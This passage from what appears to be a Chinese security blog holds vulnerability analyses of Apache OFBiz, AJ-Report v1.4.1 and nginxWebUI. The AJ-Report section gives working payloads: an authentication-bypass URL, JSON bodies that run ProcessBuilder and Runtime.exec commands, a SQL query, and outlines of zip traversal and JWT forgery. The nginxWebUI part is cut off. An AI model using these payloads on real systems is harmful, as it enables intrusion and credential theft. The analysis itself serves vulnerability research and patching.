class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">screen</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">actions</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">set</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;titleProperty&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;PageTitleEntityExportAll&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">set</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;tabButtonItem&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;programExport&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/groovyScripts/entity/ProgramExport.groovy&quot;</span>/&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">actions</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;<span class="hljs-name">widgets</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;<span class="hljs-name">decorator-screen</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;CommonImportExportDecorator&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;$&#123;parameters.mainDecoratorLocation&#125;&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;<span class="hljs-name">decorator-section</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;body&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                     <span class="hljs-tag">&lt;<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;<span class="hljs-name">include-form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/widget/MiscForms.xml&quot;</span>/&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;/<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;<span class="hljs-name">platform-specific</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                            <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html-template</span> <span class="hljs-attr">location</span>=<span class="hljs-string">&quot;component://webtools/template/entity/ProgramExport.ftl&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                        <span class="hljs-tag">&lt;/<span class="hljs-name">platform-specific</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                    <span class="hljs-tag">&lt;/<span class="hljs-name">screenlet</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">                <span class="hljs-tag">&lt;/<span class="hljs-name">decorator-section</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">            <span class="hljs-tag">&lt;/<span class="hljs-name">decorator-screen</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">        <span class="hljs-tag">&lt;/<span class="hljs-name">widgets</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars">    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;/<span class="hljs-name">screen</span>&gt;</span></span></span><br></code></pre></td></tr></table></figure><p>可以看见调用了</p><p> &#x2F;webtools&#x2F;groovyScripts&#x2F;entity&#x2F;ProgramExport.groovy</p><p>56-82行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">    parameters.groovyProgram = groovyProgram<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    groovyProgram = parameters.groovyProgram<br>&#125;<br><br><span class="hljs-comment">// Add imports for script.</span><br><span class="hljs-type">def</span> <span class="hljs-variable">importCustomizer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImportCustomizer</span>()<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.GenericValue&quot;</span>)<br>importCustomizer.addImport(<span class="hljs-string">&quot;org.apache.ofbiz.entity.model.ModelEntity&quot;</span>)<br><span class="hljs-type">def</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompilerConfiguration</span>()<br>configuration.addCompilationCustomizers(importCustomizer)<br><br><span class="hljs-type">Binding</span> <span class="hljs-variable">binding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binding</span>()<br>binding.setVariable(<span class="hljs-string">&quot;delegator&quot;</span>, delegator)<br>binding.setVariable(<span class="hljs-string">&quot;recordValues&quot;</span>, recordValues)<br><br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<br><span class="hljs-type">def</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyShell</span>(loader, binding, configuration)<br>  <span class="hljs-keyword">if</span> (UtilValidate.isNotEmpty(groovyProgram)) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// Check if a webshell is not uploaded but allow &quot;import&quot;</span><br>        <span class="hljs-keyword">if</span> (!SecuredUpload.isValidText(groovyProgram, [<span class="hljs-string">&quot;import&quot;</span>])) &#123;<br>            logError(<span class="hljs-string">&quot;================== Not executed for security reason ==================&quot;</span>)<br>            request.setAttribute(<span class="hljs-string">&quot;_ERROR_MESSAGE_&quot;</span>, <span class="hljs-string">&quot;Not executed for security reason&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        &#125;<br></code></pre></td></tr></table></figure><p>从groovyProgram获取参数，SecuredUpload.isValidText进行黑名单检查。</p><p><a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13">ofbiz-framework</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework">framework</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security">security</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src">src</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src/main">main</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src/main/java">java</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src/main/java/org">org</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src/main/java/org/apache">apache</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src/main/java/org/apache/ofbiz">ofbiz</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.13/framework/security/src/main/java/org/apache/ofbiz/security">security</a>&#x2F;SecuredUpload.java</p><p><img src="image-20240528084359723.png" alt="image-20240528084359723"></p><p>其中调用getDeniedWebShellTokens();得到黑名单。</p><p><img src="image-20240528084640609.png" alt="image-20240528084640609"></p><p>可以看到没有对**execute()**过滤。</p><p>直接可以使用. “”.execute()执行命令，或者直接unicode编码。</p><h3 id="0x03-目录遍历分析"><a href="#0x03-目录遍历分析" class="headerlink" title="0x03  目录遍历分析"></a>0x03  目录遍历分析</h3><p>​<a href="https://issues.apache.org/jira/browse/OFBIZ-13006">https://issues.apache.org/jira/browse/OFBIZ-13006</a> 官方给出了漏洞点，</p><p><a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12">ofbiz-framework</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework">framework</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp">webapp</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src">src</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main">main</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main/java">java</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main/java/org">org</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main/java/org/apache">apache</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main/java/org/apache/ofbiz">ofbiz</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main/java/org/apache/ofbiz/webapp">webapp</a>&#x2F;<a href="https://github.com/apache/ofbiz-framework/tree/release18.12.12/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control">control</a></p><p>&#x2F;ControlFilter.java</p><p>18.12</p><p><img src="image-20240528085429717.png" alt="image-20240528085429717"></p><p>18.10</p><p><img src="image-20240528085453984.png" alt="image-20240528085453984"></p><p>可以看到使用<strong>httpRequest.getRequestURI()</strong> 获取url，这么一看就有两种绕过的。**”..&#x2F;“<strong>和</strong>“;”**进行截断绕过filter处理。</p><p>来看看修复方式，</p><p>18.13</p><p><img src="image-20240528090042971.png" alt="image-20240528090042971"></p><p>equals进行判断，不一致直接抛出。</p><p>18.14</p><p><img src="image-20240528090149107.png" alt="image-20240528090149107"></p><p>url包含 <strong>“..”</strong> 或者**”;”** 替换为空，然后比较。</p><p>整个漏洞点很简单，绕过filter。</p><h3 id="0x04-复现"><a href="#0x04-复现" class="headerlink" title="0x04 复现"></a>0x04 复现</h3><p>​这里直接使用18.10的环境，懒得下了。</p><p><img src="image-20240528090628895.png" alt="image-20240528090628895"></p><p><img src="image-20240528090651475.png" alt="image-20240528090651475"></p><p>直接替换为18.13的framework&#x2F;webapp&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;apache&#x2F;ofbiz&#x2F;webapp&#x2F;control&#x2F;ControlFilter.java</p><p><img src="image-20240528091002453.png" alt="image-20240528091002453"></p><p>可以看到,使用**”;”** 截断就可以绕过检测。</p><p><img src="image-20240528091118823.png" alt="image-20240528091118823"></p><p>最后也是成功执行。</p><h3 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h3><p>​升级到官网最新版本。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>aj-report 二次就业</title>
    <link href="/2024/05/18/aj-report-%E4%BA%8C%E6%AC%A1%E5%B0%B1%E4%B8%9A/"/>
    <url>/2024/05/18/aj-report-%E4%BA%8C%E6%AC%A1%E5%B0%B1%E4%B8%9A/</url>
    
    <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>​最新先知有人发了<a href="https://xz.aliyun.com/t/14460">aj-report文章</a>，看了看，是一个filter绕过，还有jwt，竟然还没修,这是两年前发表的<a href="https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w">AJ-Report_RCE</a>。aj-report是我两年前学习代码审计审计的第一套代码，那时候藏了一些洞没写，所以现在重新看一看。 环境v1.4.1。</p><h3 id="0x01-filter-绕过"><a href="#0x01-filter-绕过" class="headerlink" title="0x01 filter 绕过"></a>0x01 filter 绕过</h3><p>com.anjiplus.template.gaea.business.filter.TokenFilter.java</p><p><img src="image-20240518162005901.png" alt="image-20240518162005901"></p><p>这获取了URL，然后判断是否包含“swagger-ui”或着”swagger-resources”，包含直接放行。</p><p>没什么好说的，鉴权绕过。</p><h3 id="0x02-sql-信息泄漏"><a href="#0x02-sql-信息泄漏" class="headerlink" title="0x02  sql 信息泄漏"></a>0x02  sql 信息泄漏</h3><p>com.anji.plus.gaea.curd.controller.GaeaBaseController#pageList</p><p><img src="image-20240518162328997.png" alt="image-20240518162328997"></p><p>直接查询dataSource的信息，然后把Dto信息全部直接放回，造成泄漏</p><p><img src="image-20240518162649169.png" alt="image-20240518162649169"></p><p><img src="image-20240518162703149.png" alt="image-20240518162703149"></p><p>Dto里面存在Collections集合，直接把配置信息放回出来。</p><p><img src="image-20240518162748790.png" alt="image-20240518162748790"></p><p>结合一下，可以拿到数据库账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/;swagger-ui/dataSource/pageList?showMoreSearch=<span class="hljs-literal">false</span>&amp;pageNumber=1&amp;pageSize=10<br></code></pre></td></tr></table></figure><h3 id="0x03-js执行命令"><a href="#0x03-js执行命令" class="headerlink" title="0x03 js执行命令"></a>0x03 js执行命令</h3><p>​参考两年前发表的<a href="https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w">AJ-Report_RCE</a>，(<a href="https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w%EF%BC%89">https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w）</a></p><p>没有修复。</p><p>第一个点 （validationRules参数校验点）</p><p>com.anjiplus.template.gaea.business.modules.dataset.service.impl.DataSetServiceImpl#testTransform</p><p><img src="image-20240518170617256.png" alt="image-20240518170617256"></p><p>看方法实现</p><p><img src="image-20240518170725585.png" alt="image-20240518170725585"></p><p><img src="image-20240518170744654.png" alt="image-20240518170744654"></p><p>然后执行。</p><p>第二个点（js脚本）</p><p>com.anjiplus.template.gaea.business.modules.datasettransform.service.impl.JsTransformServiceImpl#getValueFromJs.java</p><p><img src="image-20240518163727500.png" alt="image-20240518163727500"></p><p><img src="image-20240518163045542.png" alt="image-20240518163045542"></p><p><img src="image-20240518163123617.png" alt="image-20240518163123617"></p><p>这里两个地方都可以，也根本不用绕过。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;dynSentence&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123;\&quot;apiUrl\&quot;:\&quot;http://127.0.0.1:9095/dataSet/testTransform\&quot;,\&quot;method\&quot;:\&quot;GET\&quot;,\&quot;header\&quot;:\&quot;&#123;\\\&quot;Content-Type\\\&quot;:\\\&quot;application/json;charset=UTF-8\\\&quot;&#125;\&quot;,\&quot;body\&quot;:\&quot;\&quot;&#125;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSetParamDtoList&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;paramName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;paramDesc&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;paramType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;sampleItem&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;mandatory&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;requiredFlag&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;validationRules&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;function verification(data)&#123;var se= new javax.script.ScriptEngineManager();var r = se.getEngineByExtension(\&quot;js\&quot;).eval(\&quot;new java.lang.ProcessBuilder(&#x27;calc&#x27;).start().getInputStream();\&quot;);result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss=&#x27;&#x27;;while((line = result.readLine()) != null)&#123;ss+=line&#125;;return ss;&#125;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSetTransformDtoList&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;transformType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;js&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;transformScript&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;setType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="0x04-validationRules-命令执行"><a href="#0x04-validationRules-命令执行" class="headerlink" title="0x04 validationRules 命令执行"></a>0x04 validationRules 命令执行</h3><p>com.anjiplus.template.gaea.business.modules.datasetparam.controller.DataSetParamController#verification。java</p><p>其实看上面就知道，js的规则，然后走到eval。</p><p><img src="image-20240518163348486.png" alt="image-20240518163348486"></p><p>com.anjiplus.template.gaea.business.modules.datasetparam.service.impl.DataSetParamServiceImpl#verification(com.anjiplus.template.gaea.business.modules.datasetparam.controller.dto.DataSetParamDto)</p><p><img src="image-20240518163508484.png" alt="image-20240518163508484"></p><p>对应实现类，有绕过，套娃就行。</p><p>dto里面设置validationRules就行。</p><p><img src="image-20240518163558285.png" alt="image-20240518163558285"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sampleItem&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;validationRules&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;function verification(data)&#123;var se= new javax.script.ScriptEngineManager();var r = se.getEngineByExtension(\&quot;js\&quot;).eval(\&quot;new java.lang.ProcessBuilder(&#x27;whoami&#x27;).start().getInputStream();\&quot;);result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss=&#x27;&#x27;;while((line = result.readLine()) != null)&#123;ss+=line&#125;;return ss;&#125;&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="0x05-zip-spilf"><a href="#0x05-zip-spilf" class="headerlink" title="0x05 zip-spilf"></a>0x05 zip-spilf</h3><p>com.anjiplus.template.gaea.business.modules.dashboard.controller.ReportDashboardController#importDashboard.java</p><p><img src="image-20240518164441990.png" alt="image-20240518164441990"></p><p>对应的controller，传file流何code就好</p><p>com.anjiplus.template.gaea.business.modules.dashboard.service.impl.ReportDashboardServiceImpl#importDashboard   实现类</p><p><img src="image-20240518164555873.png" alt="image-20240518164555873"></p><p><img src="image-20240518164804829.png" alt="image-20240518164804829"></p><p>没有的zipEntry进行..&#x2F; 过滤，导致zip目录穿越。</p><p><img src="image-20240518165010494.png" alt="image-20240518165010494"></p><p><img src="image-20240518165146571.png" alt="image-20240518165146571"></p><p>然后ssh 指定私钥连接。</p><h3 id="0x06-大屏分享信息泄漏"><a href="#0x06-大屏分享信息泄漏" class="headerlink" title="0x06 大屏分享信息泄漏"></a>0x06 大屏分享信息泄漏</h3><p>com.anjiplus.template.gaea.business.modules.reportshare.controller.ReportShareController#detailByCode</p><p><img src="image-20240518165304296.png" alt="image-20240518165304296"></p><p>对象实现类</p><p><img src="image-20240518165347451.png" alt="image-20240518165347451"></p><p>根据shareCode可以获取到查询信息，然后加密后直接放回</p><p><img src="image-20240518165529103.png" alt="image-20240518165529103"></p><p>jwt可以直接解密</p><p><img src="image-20240518165611067.png" alt="image-20240518165611067"></p><p>直接可以获得分享密码。</p><h3 id="0x07-java代码执行"><a href="#0x07-java代码执行" class="headerlink" title="0x07 java代码执行"></a>0x07 java代码执行</h3><p>​还是数据集那个点，走java方式。</p><p>com.anjiplus.template.gaea.business.modules.dataset.service.impl.DataSetServiceImpl#testTransform</p><p><img src="image-20240518171003277.png" alt="image-20240518171003277"></p><p>对应实现类</p><p>com.anjiplus.template.gaea.business.modules.datasettransform.service.impl.DataSetTransformServiceImpl#transform</p><p><img src="image-20240518171024005.png" alt="image-20240518171024005"></p><p>com.anjiplus.template.gaea.business.modules.datasettransform.service.impl.GroovyTransformServiceImpl#transform</p><p><img src="image-20240518171125405.png" alt="image-20240518171125405"></p><p>最后会来到GroovyClassLoader，进行处理，也就是我们写一个类给GroovyClassLoader加载就好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.anjiplus.template.gaea.business.modules.datasettransform.service.IGroovyHandler;<br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IGroovyHandler</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;JSONObject&gt; <span class="hljs-title function_">transform</span><span class="hljs-params">(List&lt;JSONObject&gt; data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">execResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();<br>        <span class="hljs-keyword">return</span> Arrays.asList(execResult.split(<span class="hljs-string">&quot;\\s+&quot;</span>));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="image-20240518172641917.png" alt="image-20240518172641917"></p><p>能写代码，那就打下内存马吧。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><br></code></pre></td></tr></table></figure><p><img src="image-20240518180552989.png" alt="image-20240518180552989"></p><p>成功.</p><h3 id="0x08-jwt-绕过登录"><a href="#0x08-jwt-绕过登录" class="headerlink" title="0x08 jwt 绕过登录"></a>0x08 jwt 绕过登录</h3><p>com.anjiplus.template.gaea.business.modules.accessuser.service.impl.AccessUserServiceImpl#login</p><p><img src="image-20240518181616974.png" alt="image-20240518181616974"></p><p>com.anji.plus.gaea.utils.JwtBean#createToken(java.lang.String, java.lang.String, java.lang.Integer, java.lang.String)</p><p><img src="image-20240518181652357.png" alt="image-20240518181652357"></p><p>com.anji.plus.gaea.GaeaProperties.Security#jwtSecret<img src="image-20240518181731845.png" alt="image-20240518181731845"></p><p>这里密钥是写在依赖包下，无法修改</p><p><img src="image-20240518181810240.png" alt="image-20240518181810240"></p><p>这一块得修改一下</p><p><img src="image-20240518182103331.png" alt="image-20240518182103331"></p><p>jwt验证只校验用户名，这边key没法改，随便伪造</p><p>具体参考(<a href="https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w%EF%BC%89">https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w）</a></p><h3 id="0x09-sql问题"><a href="#0x09-sql问题" class="headerlink" title="0x09 sql问题"></a>0x09 sql问题</h3><p>​本质是没做用户权限校验，导致任何人都能操作，由于有filter绕过，就写出来吧</p><p>com.anjiplus.template.gaea.business.modules.dataset.service.impl.DataSetServiceImpl#testTransform</p><p>还是这个点</p><p><img src="image-20240518183214449.png" alt="image-20240518183214449"></p><p>从DTO里面获取参数，然后查询</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;sourceCode&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;utf_8&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dynSentence&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;show DATABASES&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSetParamDtoList&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSetTransformDtoList&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;setType&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sql&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="image-20240518183243070.png" alt="image-20240518183243070"></p><p>也就是可以直接利用sql修改账号密码。</p><h3 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h3><p>接口健全确实，主要靠filter，一些重要的接口，权限缺失，如&#x2F;dataSource、&#x2F;dataSet下的接口，匿名用户也可以操作，filter建议直接使用getServletPath()，或者重写一下。</p><p>jwt的认证密钥是写在依赖包里面，无法修改.</p><p>返回包里面的DTO，把敏感字短执行加密。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>cms</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nginxwebui&lt;=3.9.9后台rce</title>
    <link href="/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/"/>
    <url>/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/</url>
    
    <content type="html"><![CDATA[<p>​首发于<a href="https://xz.aliyun.com/t/14227">https://xz.aliyun.com/t/14227</a>  </p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​半年前，审计过一次这套代码，那时候想着后台有命令执行的功能点，就没关注rce，审计了一些别的水洞。这次hookdd没事，说审计了一个rce，说一起看看，所以这次就只看rce，最后就有个以下几个洞。本次使用的3.9.8版本，但是刚刚更新了3.9.9，不过看描述，并没有修复一下几个点，应该都可以使用。（最新版依旧可用，nginx恶意配置看来是修不了了）</p><h2 id="0x01-zip自解压"><a href="#0x01-zip自解压" class="headerlink" title="0x01 zip自解压"></a>0x01 zip自解压</h2><p>com.cym.controller.adminPage.MainController#upload </p><p><img src="image-20240329094943539.png" alt="image-20240329094943539"></p><p>功能比较简单，可以看见把tmpdir+’&#x2F;‘+文件名拼接，然后保存进去，没有限制后缀，其实限制不限制都能r掉。</p><p>其中FileUtil.getTmpDir()会获取系统的临时目录，mac系统为</p><p><img src="image-20240329095519164.png" alt="image-20240329095519164"></p><p><img src="image-20240329095527428.png" alt="image-20240329095527428"></p><p>ubuntu系统的临时目录为&#x2F;tmp。</p><p>对应的前端功能点</p><p><img src="image-20240329100106111.png" 